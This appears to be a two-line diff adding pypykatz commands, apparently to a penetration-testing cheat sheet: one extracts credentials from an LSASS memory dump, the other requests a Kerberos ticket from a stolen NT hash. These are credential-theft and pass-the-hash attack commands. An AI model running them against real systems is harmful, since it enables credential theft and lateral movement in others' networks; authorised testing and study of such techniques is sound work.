@@ -1,0 +1,2 @@
+pypykatz lsa minidump lsass.dmp
+pypykatz kerberos tgt "kerberos+rc4://$DOMAIN\\$USER:$NT_HASH@$DOMAIN"
